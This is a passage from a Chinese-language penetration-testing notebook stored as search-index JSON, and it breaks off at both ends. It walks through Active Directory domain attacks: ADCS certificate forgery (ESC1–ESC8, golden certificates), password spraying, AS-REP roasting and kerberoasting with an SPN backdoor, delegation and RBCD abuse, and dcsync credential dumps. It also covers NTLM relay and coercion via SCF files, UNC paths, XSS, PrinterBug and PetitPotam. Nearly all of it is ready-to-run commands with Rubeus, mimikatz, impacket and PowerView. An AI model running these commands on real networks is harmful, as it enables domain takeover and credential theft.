\u5f53\u5b58\u5728\u9519\u8bef\u914d\u7f6e\u65f6\u53ef\u8fdb\u884c\u5229\u7528\u3002 Certify.exe request /ca:\"DC.exp1.com\\exp1-DC-CA\" /template:\u201dESC1\u201c /altname:administrator \u5c06\u83b7\u53d6\u7684pem\u8bc1\u4e66\u8f6c\u6362\u6210pfx openssl pkcs12 -in ~/cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out ~/cert.pfx \u5229\u7528\u8bc1\u4e66\u7533\u8bf7\u57df\u7ba1\u7684TGT Rubeus4.exe asktgt /user:Administrator /certificate:cert.pfx /password:123456 /outfile:cert.kribi /ptt","title":"\u4f2a\u9020\u8bc1\u4e66-ESC1"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#-esc2esc3","text":"\u6ce8\u518c\u4ee3\u7406\u8bc1\u4e66\u6ee5\u7528 Certify.exe request /ca:\"DC.exp1.com\\exp1-DC-CA\" /template:ESC3_2 /onbehalfof:administrator /enrollcert:esc3_1.pfx /enrollcertpw:123456","title":"\u4f2a\u9020\u8bc1\u4e66-ESC2&amp;ESC3"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#-esc6","text":"EDITF_ATTRIBUTESUBJECTALTNAME2 \u6ee5\u7528 \u5224\u65adCA\u662f\u5426\u5f00\u542fSAN\u6807\u8bc6\uff0c\u5982\u5b58\u5728EDITF_ATTRIBUTESUBJECTALTNAME2 \uff0c\u5219\u53ef\u5229\u7528 certutil -config \"DC.exp1.com\\exp1-DC-CA\" -getreg \"policy\\EditFlags\" \u521b\u5efa\u8bc1\u4e66\u8bf7\u6c42 certreq \u2013new usercert.inf certrequest.req #usercert.inf [NewRequest] KeyLength=2048 KeySpec=1 RequestType = PKCS10 Exportable = TRUE ExportableEncrypted = TRUE [RequestAttributes] CertificateTemplate=USER","title":"\u4f2a\u9020\u8bc1\u4e66-ESC6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#-esc7","text":"","title":"\u8bc1\u4e66\u673a\u6784\u653b\u51fb-ESC7"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#-esc8","text":"\u5229\u7528req\u8bf7\u6c42\u5f97\u5230\u8bc1\u4e66 certreq -submit -config \"DC.exp1.com\\exp1-DC-CA\" -attrib \"SAN:upn=administrator@exp.com\" certrequest.req certrequest.cer \u7136\u540e\u5bfc\u5165cer\u540e\u5c06\u8bc1\u4e66\u5bfc\u51fapfx\u683c\u5f0f\uff0c\u518d\u83b7\u53d6tgt","title":"\u4e2d\u7ee7\u653b\u51fb-ESC8"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_62","text":"\u5728CA\u670d\u52a1\u5668\u4e0a\u4f7f\u7528ForgeCert\u6765\u5bfc\u51fapem\u7684\u8bc1\u4e66,\u518d\u8f6c\u6362\u6210pfx Forgecert -i cert.pfx -o admin.pfx -pfx -p 123123 -op 123123 -a administrator","title":"\u9ec4\u91d1\u8bc1\u4e66"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_63","text":"\u4f7f\u7528DomainPasswordSpray.ps1 https://github.com/dafthack/DomainPasswordSpray powershell.exe -exec bypass Import-Module DomainPasswordSpray.ps1 #\u679a\u4e3e\u7528\u6237\u8f93\u51fa\u6210txt Get-DomainUserList | Out-File -Encoding ascii userlist.txt #\u55b7\u6d12 Invoke-DomainPasswordSpray -UserList users.txt -Domain exp.com -PasswordList passlist.txt -OutFile sprayed-creds.txt","title":"\u5bc6\u7801\u55b7\u6d12"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#as-reproasting","text":"\u5982\u679c\u5b58\u5728\u8bbe\u7f6e\u4e86\u9009\u9879\u4e0d\u9700\u8981kerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\uff0c\u53ef\u4ee5\u76f4\u63a5\u653b\u51fb \u67e5\u627e\u5177\u6709\u6b64\u5c5e\u6027\u7684\u7528\u6237 Import-Module .\\PowerView.ps1 Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose \u53d1\u5305\u4e14\u76d1\u542c Rubeus.exe asreproast Rubeus.exe asreproast /dc:xxx","title":"AS-REPRoasting"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#gpp","text":"\u8bfb\u53d6\u7ec4\u7b56\u7565\u6587\u4ef6 dir /s /a \\\\DC.exp.com\\SYSVOL\\exp.com\\*.xml powershell import-modulo .\\Get-GPPpassword.ps1;Get-GppPassword","title":"GPP\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#kerberoasting","text":"\u5176\u539f\u7406\u5728\u4e8e\u5148\u7528LDAP\u67e5\u8be2\u4e8e\u57df\u7684spn\uff0c\u518d\u901a\u8fc7\u53d1\u9001TGS\u5305\uff0c\u63d0\u53d6\u62fc\u63a5\u5f97\u5230hashcat\u6216\u8005john\u80fd\u7206\u7834\u7684\u683c\u5f0f\u3002 python3 targetedKerberoast.py -v -d exp1.com -u user -p xx rubeus\u653b\u51fb\u76f4\u63a5\u4e00\u952e\u5316\u4e86\u3002 \u53d1\u5305\u5e76\u76d1\u542c rubeus.exe kerberoast kirbi\u7968\u636e\u7834\u89e3 python tgsrepcrack.py mima.txt 123.kirbi \u7559\u540e\u95e8 \u7ed9\u7ba1\u7406\u5458\u6ce8\u518c\u4e00\u4e2aUNC\u7684\u670d\u52a1\u7559\u540e\u95e8\uff0c\u968f\u65f6\u53ef\u4ee5\u62ff\u8bfb\u7ba1\u7406\u5458kirbi setspn -U -A UNC/dc.exp.com administrator","title":"kerberoasting"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_64","text":"\u5728adsiedit.msc\u53ef\u4ee5\u6253\u5f00ADSI\u7f16\u8f91\u5668\u94fe\u63a5LDAP\u3002 Kerberos \u59d4\u6d3e\u662f\u4e00\u79cd\u5141\u8bb8\u670d\u52a1\u5c06\u7528\u6237\u6a21\u62df\u53ef\u4ee5\u8bbf\u95ee\u5230\u5176\u4ed6\u670d\u52a1\u7684\u673a\u5236\u3002\u4f8b\u5982\uff0c\u7528\u6237\u53ef\u4ee5\u8bbf\u95ee\u524d\u7aef\u5e94\u7528\u7a0b\u5e8f\uff0c\u800c\u8be5\u5e94\u7528\u7a0b\u5e8f\u53c8\u53ef\u4ee5\u4f7f\u7528\u7528\u6237\u7684\u6807\u8bc6\u548c\u6743\u9650\u8bbf\u95ee\u540e\u7aef API\u3002 \u914d\u7f6e\u65e0\u7ea6\u675f\u59d4\u6d3e\u548c\u7ea6\u675f\u59d4\u6d3e\u9700\u8981 SeEnable\u59d4\u6d3e\u6743\u9650\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8be5\u6743\u9650\u4ec5\u6388\u4e88\u57df\u7ba1\u7406\u5458\u3002\u56e0\u6b64\uff0c\u5373\u4f7f\u7528\u6237\u5bf9 AD \u5e10\u6237\u5177\u6709\u5b8c\u5168\u63a7\u5236 \uff08GenericAll\uff09\uff0c\u5982\u679c\u4e0d\u5177\u6709 SeEnableDelegation \u7279\u6743\uff0c\u4ed6\u4e5f\u65e0\u6cd5\u914d\u7f6e\u8fd9\u4e9b Kerberos \u59d4\u6d3e\u7c7b\u578b\u4e2d\u7684\u4efb\u4f55\u4e00\u79cd\u3002\u4e0e\u65e0\u7ea6\u675f\u59d4\u6d3e\u548c\u7ea6\u675f\u59d4\u6d3e\u4e0d\u540c\uff0cRBCD \u8981\u6c42\u6709\u6743\u66f4\u6539 msDS-AllowedToActOnBehalfOfOtherIdentity \u5c5e\u6027\uff0c\u4f46\u6ca1\u6709\u7279\u6743\u3002","title":"\u59d4\u6d3e\u653b\u51fb"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_65","text":"\u975e\u7ea6\u675f\u59d4\u6d3e\u8981\u6c42\u7528\u6237\u5c06\u5176\u7968\u8bc1\u6388\u4e88\u7968\u8bc1 \uff08TGT\uff09 \u53d1\u9001\u5230\u524d\u7aef\u670d\u52a1\uff08\u670d\u52a1\u5668 A\uff09\u3002\u7136\u540e\uff0c\u524d\u7aef\u670d\u52a1\uff08\u670d\u52a1\u5668A\uff09\u53ef\u4ee5\u4f7f\u7528\u8be5\u7968\u8bc1\u5c06\u7528\u6237\u6a21\u62df\u5230\u4efb\u4f55\u670d\u52a1\uff0c\u5305\u62ec\u540e\u7aef\u670d\u52a1\uff08\u670d\u52a1\u5668 B\uff09\u3002 \u56e0\u4e3a\u53ef\u4ee5\u6a21\u62df\u5230\u4efb\u4f55\u670d\u52a1\uff0c\u6240\u4ee5\u53eb\u975e\u7ea6\u675f\u7684\u3002 \u653b\u51fb\u5229\u7528\uff1a 1.\u627e\u5230\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u7684\u59d4\u6d3e\u7684\u673a\u5668\u8d26\u6237\uff08\u4f7f\u7528\u547d\u4ee4\uff09 2.\u62ff\u4e0b\u6743\u9650 3.\u76d1\u542c\u6765\u81eaDC\u7684\u8bbf\u95ee \u9700\u8981\u4ee5\u673a\u5668\u7528\u6237\u7684\u6743\u9650\u8fd0\u884c\uff0c\u4e5f\u5c31\u662fsystem Rubeus.exe monitor /interval:1 /filteruser:dc$ 4.\u89e6\u53d1NTLM\u4e2d\u7ee7\uff0c\u5f97\u5230\u57df\u63a7\u7684\u7968\u636e a.\u6253\u5370\u673a\u6f0f\u6d1e b.\u5176\u4ed6UNC\u65b9\u5f0f\uff0c\u9700\u8981\u57df\u7ba1\u4ea4\u4e92 5.\u5bfc\u5165base64\u7684ticket .\\Rubeus.exe ptt /ticket:base64 mimikatz\u5bfc\u51fa\u7968\u636e privilege::debug sekurlsa::tickets /export \u8fd8\u53ef\u901a\u8fc7powershell\u5199\u6210\u7968\u636e\u6587\u4ef6\uff0c\u53ef\u4ee5\u7528rubeus\u76f4\u63a5\u5bfc\u51fa [IO.File]::WriteAllBytes(\"ticket.kirbi\", [Convert]::FromBase64String(\"Y21kIC9jIG5ldCB1c2VyIGJ5cGFzc3VhYyAxMjM0NTYgL2FkZA==\")) PTT kerberos::ptt 1.kirbi lsadump::dcsync /domain:test.local /all /csv","title":"\u975e\u7ea6\u675f\u59d4\u6d3e\u653b\u51fb"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_66","text":"\u7ea6\u675f\u59d4\u6d3e\u5141\u8bb8\u524d\u7aef\u670d\u52a1\uff08\u670d\u52a1\u5668 A\uff09\u83b7\u53d6 Kerberos \u670d\u52a1\u7968\u8bc1\uff0c\u4ee5\u4fbf\u7528\u6237\u8bbf\u95ee\u7531\u5176\u670d\u52a1\u4e3b\u4f53\u540d\u79f0 \uff08SPN\uff09 \u6307\u5b9a\u7684\u9884\u5b9a\u4e49\u670d\u52a1\u5217\u8868\uff0c\u4f8b\u5982\u540e\u7aef\u670d\u52a1\u670d\u52a1\u5668 B\u3002 \u8bf7\u6ce8\u610f\uff0c\u7ea6\u675f\u59d4\u6d3e\u5141\u8bb8\u670d\u52a1\u51ed\u7a7a\u6a21\u62df\u7528\u6237\uff0c\u65e0\u8bba\u4ed6\u4eec\u662f\u5426\u901a\u8fc7\u670d\u52a1\u8eab\u4efd\u9a8c\u8bc1\u3002\u8bb8\u591a\u4eba\u8ba4\u4e3a\u8fd9\u53d6\u51b3\u4e8e TrustedToAuthForDelegation \u5c5e\u6027\u7684\u914d\u7f6e\u3002 \u7ea6\u675f\u59d4\u6d3e\u53ea\u80fd\u59d4\u6d3e\u8bbf\u95eeSPN\u6307\u5b9a\u7684\u670d\u52a1\uff0c\u6240\u4ee5\u53eb\u7ea6\u675f\u7684\u3002 S4U2SELF\u6982\u5ff5 \u4f7f\u5f97\u670d\u52a1\u53ef\u4ee5\u4ee3\u8868\u7528\u6237\u83b7\u5f97\u9488\u5bf9\u670d\u52a1\u81ea\u8eab\u7684kerberos\u670d\u52a1\u7968\u636e\u3002\u670d\u52a1\u5411KDC\u8ba4\u8bc1\u6210\u529f\u540e\uff0c\u670d\u52a1\u4ee3\u8868\u7528\u6237\u83b7\u5f97\u8bbf\u95ee\u670d\u52a1\u7684\u7968\u636e\u3002 S4U2PROXY\u6982\u5ff5 \u670d\u52a11\u62ff\u7740S4U2SELF\u7533\u8bf7\u5230\u7684\u7968\u636e\u5411\u670d\u52a12\u7533\u8bf7\u8bbf\u95ee\u670d\u52a12\u7684\u7968\u636e \u59d4\u6d3e\u670d\u52a11\u53ea\u80fd\u8bbf\u95ee\u670d\u52a12\u7684\u67d0\u4e9b\u8d44\u6e90\u3002 DC\u4e0a\u914d\u7f6e\u59d4\u6d3e\u7528\u6237\uff0c\u7528\u6765\u5904\u7406\u5176\u4ed6\u7528\u6237\u5bf9DC\u4e0a\u7279\u5b9a\u670d\u52a1\u7684\u8bbf\u95ee\u8bf7\u6c42 DC\u4e0a\u914d\u7f6e\u59d4\u6d3e\u4e3b\u673a\uff0c\u7528\u6765\u5904\u7406\u5176\u4ed6\u7528\u6237\u5bf9DC\u4e0a\u7279\u5b9a\u670d\u52a1\u7684\u8bbf\u95ee\u8bf7\u6c42 1.\u627e\u5230\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u7684\u59d4\u6d3e\u7684\u8d26\u6237\u548c\u4e3b\u673a 2.\u62ff\u4e0b\u6743\u9650 3.\u57fa\u4e8e\u59d4\u6d3e\u670d\u52a1\u7528\u6237\u5411\u670d\u52a1\u5668\u8bf7\u6c42TGT \u4f7f\u7528keko\u5192\u5145\u59d4\u6d3e\u670d\u52a1\u7528\u6237\u8bf7\u6c42TGT\uff0c\u5bc6\u7801\u660e\u6587\uff0chash\uff0caes\u52a0\u5bc6\u90fd\u884c tgt::ask /user: /domain:exp.com /password:password tgt::ask /user:PC2$ /domain:exp1.com /NTLM:29a243bdf1df2e2e770c943e20de4d4b 4.\u901a\u8fc7s4u\u4f2a\u9020administrator@exp.comifs\u670d\u52a1 tgs::s4u /tgt:1.kirbi /user:administrator /service:cifs/iis.exp1.com S4U2Self\u83b7\u53d6\u5230\u7684ST1\u4ee5\u53caS4U2Proxy\u83b7\u53d6\u5230\u7684dm08 CIFS\u670d\u52a1\u7684ST2\u4f1a\u4fdd\u5b58\u5728\u5f53\u524d\u76ee\u5f55\u4e0b 5.PTT kerberos::ptt administrator@cifs.kirbi","title":"\u7ea6\u675f\u59d4\u6d3e\u653b\u51fb"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#-rbcd","text":"RBCD \u4e0e\u7ea6\u675f\u59d4\u6d3e\u975e\u5e38\u76f8\u4f3c\uff0c\u53ea\u662f\u7ea6\u675f\u7684\u65b9\u5411\u662f\u76f8\u53cd\u7684\u3002\u5b83\u6307\u5b9a\u5141\u8bb8\u8c01\u59d4\u6d3e\u7ed9\u670d\u52a1\uff0c\u800c\u4e0d\u662f\u5141\u8bb8\u670d\u52a1\u59d4\u6d3e\u7ed9\u8c01\u3002\u6362\u8a00\u4e4b\uff0c\u5982\u679c\u5141\u8bb8\u670d\u52a1\u5668 A \u5728\u7ea6\u675f\u59d4\u6d3e\u4e2d\u59d4\u6d3e\u7ed9\u670d\u52a1\u5668 B\uff0c\u5219\u5c06\u5728\u670d\u52a1\u5668 A \u7684\u5c5e\u6027\u4e2d\u914d\u7f6e\u7ea6\u675f\u3002\u5728 RBCD \u4e2d\uff0c\u5b83\u5c06\u5728\u670d\u52a1\u5668 B \u7684\u5c5e\u6027\u4e2d\u8fdb\u884c\u914d\u7f6e\u3002 \u7ea6\u675f\u59d4\u6d3e\u548c RBCD \u4e4b\u95f4\u7684\u53e6\u4e00\u4e2a\u91cd\u8981\u533a\u522b\u662f\uff0c\u7ea6\u675f\u59d4\u6d3e\u6307\u5b9a\u76ee\u6807\u670d\u52a1\u7684 SPN\u3002\u76f8\u53cd\uff0cRBCD \u5728\u5b89\u5168\u63cf\u8ff0\u7b26\u4e2d\u6307\u5b9a\u88ab\u59d4\u6d3e\u670d\u52a1\u7684 SID\u3002 \u89e3\u91ca\u6709\u70b9\u7ed5\uff0c\u7b80\u5355\u5730\u8bf4\u5c31\u662f\uff0c\u7ea6\u675f\u59d4\u6d3e\u662f\u59d4\u6d3e\u67d0\u4e2a\u670d\u52a1\u80fd\u4ee3\u8868\u7528\u6237\u80fd\u8bbf\u95ee\u54ea\u4e9b\u670d\u52a1\uff08SPN\uff09\uff0c\u8fd9\u662f\u6307\u5b9aSPN\uff1b\u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\u662f\u59d4\u6d3e\u8fd9\u4e2a\u670d\u52a1\uff08SPN\uff09\u80fd\u88ab\u54ea\u4e9b\u88ab\u59d4\u6d3e\u7684\u670d\u52a1\u8bbf\u95ee\uff0c\u6307\u5b9a\u88ab\u59d4\u6d3e\u7684\u90a3\u4e9b\u670d\u52a1\u7684SID\u3002 \u653b\u51fb\u5229\u7528 \u9002\u75282012 R2\u548cWindows Server 2012\u53ca\u4ee5\u4e0a\u3002\u5b9e\u73b0\u5229\u7528\u57df\u5185\u7528\u6237\u5bf9\u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\u673a\u5668\u7684\u653b\u51fb\uff0c\u5982\u679c\u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\u673a\u5668\u662f\u57df\u63a7\uff0c\u90a3\u4e48\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u57df\u63a7\u7684\u653b\u51fb\u3002 \u5229\u7528\u5f97\u5230\u7684a2\u7528\u6237\u6dfb\u52a0\u4e00\u4e2a\u673a\u5668\u8d26\u6237test2$ addcomputer.py -method SAMR -dc-ip 192.168.52.100 -computer-name test4 -computer-pass Aa123456 \"exp1.com/a2:Aa123123\" \u6a21\u62df\u914d\u7f6etest2$\u5230IIS\u7684\u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\uff0c\u9700\u8981\u914d\u7f6e\u59d4\u6d3e\u7684\u6743\u9650\uff08msDS-AllowedToDelegateTo\uff09 \u8fd9\u91cc\u662f\u76f4\u63a5\u5728\u83b7\u53d6\u7684\u57df\u5185\u673a\u5668\u4e0a\u6dfb\u52a0\u59d4\u6d3e\u914d\u7f6e\uff08\u66f4\u6539msDS-AllowedToActOnBehalfOfOtherIdentity\u5c5e\u6027\uff09\u3002\u8fd8\u53ef\u4ee5\u5229\u7528\u4e2d\u7ee7\u4fee\u6539\u8d44\u6e90\u59d4\u6d3e\u914d\u7f6e\uff0c\u4f46\u9700\u8981\u88ab\u4fee\u6539\u7684\u673a\u5668\u5f00\u542f\u4e86webclient\u670d\u52a1\u3002 \u4f7f\u7528powerview\u67e5\u8be2sid Get-NetComputer test4 \u8bbe\u7f6e\u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3280894980-4031048059-2076154112-1129)\" $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer IIS| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose S4U\u653b\u51fb\uff0c\u83b7\u53d6\u7ba1\u7406\u5458\u7968\u636e getST.py -dc-ip 192.168.52.100 -spn cifs/iis -impersonate Administrator exp1.com/test2$:Aa123123 \u5bf9IIS\u7684PTT export KRB5CCNAME=Administrator.ccache psexec.py -no-pass -k iis","title":"\u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\u653b\u51fb-RBCD"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#ntml-relay","text":"NTLM\u534f\u8bae\u662f\u52a0\u8f7d\u5728smb\u3001http\u3001ldap\u7b49\u534f\u8bae\u4e0a\u7684\uff0crelay\u653b\u51fb\u7684\u8fc7\u7a0b\u5c31\u662f\u4e2d\u95f4\u4eba\u653b\u51fb\u7684\u8fc7\u7a0b\u3002\u4e3b\u8981\u7528\u4e8e\u57df\u5185\u653b\u51fb\u3002 v1\u7248\u672c\u7684NET NTLM\u62ff\u5230\u76f8\u5f53\u4e8e\u62ff\u5230hash\uff0c\u4f7f\u7528 \u8fd9\u91cc \u7834\u89e3NET NTLMv1\u4e0d\u9700\u8981RELAY\uff0c\u4e0d\u8fc7v1\u7248\u672c\u5728win7/server2008\u4e4b\u540e\u5c31\u4e0d\u9002\u7528\u4e86\uff0c\u4e4b\u540e\u7684\u7248\u672c\u90fd\u662fv2\uff0cv2\u7684\u653b\u51fb\u65b9\u5f0f\u4e3b\u8981\u662frelay\u3002 v2\u7684\u7834\u89e3\u4f7f\u7528hashcat hashcat -m 5600 win10::TEST:1122334455667788:622DED0816CFF5A0652209F20A7CF17A:0101000000000000C0653150DE09D201532C07A7DEE654B8000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000010000000020000067840C88904F15E659858A3CBA35EBEF61A38EC88C5E3D26B968F1C20C9ACAC10A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E003100300030002E0031000000000000000000 /tmp/password.dic --force \u4ee5\u4e0b\u5206\u4e09\u79cd\u4e0d\u540c\u534f\u8bae\u7684\u5229\u7528\u65b9\u5f0f\u8fdb\u884c\u8bf4\u660e\u3002 responder\u5de5\u5177\u53d1\u8d77\u76d1\u542chttps://github.com/lgandx/Responder\uff0c\u4f46\u4e0d\u80fd\u4e2d\u7ee7\u3002 \u76d1\u542c\u542f\u52a8\u540e\uff0c\u4f1a\u81ea\u52a8\u6355\u83b7NTLM\u9a8c\u8bc1 responder -I eth0 -A impacket\u4e0b\u7684ntlmrelayx\u548cldaprelax\u90fd\u53ef\u4ee5\u4e2d\u7ee7\u3002 \u63a5\u6536smb\uff0c\u4e2d\u7ee7\u5230smb ntlmrelayx.py -t smb://10.0.2.5 -c whoami -smb2support \u63a5\u6536smb\uff0c\u4e2d\u7ee7\u5230ldap ntlmrelayx.py -t ldap://10.0.2.5 -c whoami -smb2support","title":"NTML RELAY\u653b\u51fb"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#relay2smb","text":"","title":"RELAY2SMB"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_67","text":"\u4fee\u6539\u684c\u9762\u7684desktop.ini\u7684IconResource\u8def\u5f84\u4e3aUNC\u8def\u5f84\uff0c\u5f53\u5728\u57df\u63a7\u4e0a\u6253\u5f00\u684c\u9762\u6587\u4ef6\u5939\u65f6\u53ef\u6210\u529f\u653b\u51fb","title":"\u684c\u9762"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#scf","text":"\u65b0\u5efascf\u6587\u4ef6\uff0c\u653e\u5230\u6587\u4ef6\u5939\u4e0b\uff0c\u8bf1\u5bfc\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u5939 [Shell] Command=2 IconFile=\\\\10.0.2.4\\scf\\test.ico [Taskbar] Command=ToggleDesktop","title":"SCF\u6587\u4ef6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_68","text":"win10\u7684\u60c5\u51b5\u4e0b\uff0c\u4fee\u6539\u7528\u6237\u7684\u5934\u50cf\u4e3aUNC\u5730\u5740","title":"\u7528\u6237\u5934\u50cf"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_69","text":"\u4ee5\u4e0b\u662f\u53ef\u4ee5\u643a\u5e26UNC\u7684\u547d\u4ee4\u3002\u90fd\u53ef\u4ee5\u547d\u4ee4\u6267\u884c\u4e86\uff0c\u8fd8\u9700\u8981relay\u5417\uff1f > net.exe use \\hostshare > attrib.exe \\hostshare > bcdboot.exe \\hostshare > bdeunlock.exe \\hostshare > cacls.exe \\hostshare > certreq.exe \\hostshare #(noisy, pops an error dialog) > certutil.exe \\hostshare > cipher.exe \\hostshare > ClipUp.exe -l \\hostshare > cmdl32.exe \\hostshare > cmstp.exe /s \\hostshare > colorcpl.exe \\hostshare #(noisy, pops an error dialog) > comp.exe /N=0 \\hostshare \\hostshare > compact.exe \\hostshare > control.exe \\hostshare > convertvhd.exe -source \\hostshare -destination \\hostshare > Defrag.exe \\hostshare > diskperf.exe \\hostshare > dispdiag.exe -out \\hostshare > doskey.exe /MACROFILE=\\hostshare > esentutl.exe /k \\hostshare > expand.exe \\hostshare > extrac32.exe \\hostshare > FileHistory.exe \\hostshare #(noisy, pops a gui) > findstr.exe * \\hostshare > fontview.exe \\hostshare #(noisy, pops an error dialog) > fvenotify.exe \\hostshare #(noisy, pops an access denied error) > FXSCOVER.exe \\hostshare #(noisy, pops GUI) > hwrcomp.exe -check \\hostshare > hwrreg.exe \\hostshare > icacls.exe \\hostshare > licensingdiag.exe -cab \\hostshare > lodctr.exe \\hostshare > lpksetup.exe /p \\hostshare /s > makecab.exe \\hostshare > msiexec.exe /update \\hostshare /quiet > msinfo32.exe \\hostshare #(noisy, pops a \"cannot open\" dialog) > mspaint.exe \\hostshare #(noisy, invalid path to png error) > msra.exe /openfile \\hostshare #(noisy, error) > mstsc.exe \\hostshare #(noisy, error) > netcfg.exe -l \\hostshare -c p -i foo","title":"\u547d\u4ee4\u6267\u884c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#xss","text":"\u9002\u7528\u4e8eIE\u548cEDGE\uff0c\u8fd8\u53ef\u4ee5\u7ed3\u5408NBNS\u6295\u6bd2\u5229\u7528 <script src=\"api/images/d6p2cWHmAlOa/xss\">","title":"XSS"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_70","text":"\u540cXSS <img src=\"api/images/FuF94ZAJsdxd/outlook\">","title":"\u90ae\u4ef6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#mysql","text":"\u9700\u8981\u5177\u5907load_file\u6743\u9650\uff0c\u4e14\u6ca1\u6709secure_file_priv\u7684\u9650\u5236(5.5.53\u9ed8\u8ba4\u662f\u7a7a\uff0c\u4e4b\u540e\u7684\u8bdd\u9ed8\u8ba4\u4e3aNULL\u5c31\u4e0d\u597d\u5229\u7528\u4e86,\u4e0d\u6392\u9664\u4e00\u4e9b\u7ba1\u7406\u5458\u4f1a\u6539) select load_file('\\\\\\\\172.16.100.1\\\\mysql');","title":"mysql"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#nbnsllmnr","text":"\u6ee5\u7528MachineAccountQuota\u5c5e\u6027\uff0c\u6dfb\u52a0NS\u89e3\u6790\u6761\u76ee Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.0.2.4","title":"NBNS\u548cLLMNR"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#xxessrf","text":"SSRF\u4f7f\u7528file\u534f\u8bae\uff0cXXE xml\u6587\u4ef6\u4f7f\u7528UNC\u8def\u5f84\u6216http\u534f\u8bae\u3002 \u914d\u5408NBNS\u53ef\u4ee5\u76f4\u63a5\u5229\u7528http\u534f\u8bae","title":"XXE&amp;SSRF"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#ms-rprn-printerbug","text":"\u672c\u5730\u6d4b\u8bd5printerbug.py\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u5f00\u4e86Print Spooler\u670d\u52a1\u4e0d\u884c\uff0c\u8fd8\u9700\u8981\u8bbe\u7f6e\u4e00\u4e2a\u5171\u4eab\u7684\u6253\u5370\u673a\u3002 python printerbug.py exp.com/cs@10.0.2.5 10.0.2.4 SpoolSample.exe \u76ee\u6807 \u56de\u8fde","title":"MS-RPRN (PrinterBug)"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#ms-efsrpc-petitpotam","text":"\u5229\u7528MS-EFSRPC\u7f3a\u9677\uff0c\u4f7fAD\u5f3a\u5236\u53d1\u9001\u8ba4\u8bc1\uff0c5\u4e3aNTLM\u76d1\u542c\uff0c254\u4e3a\u76ee\u6807DC\u3002 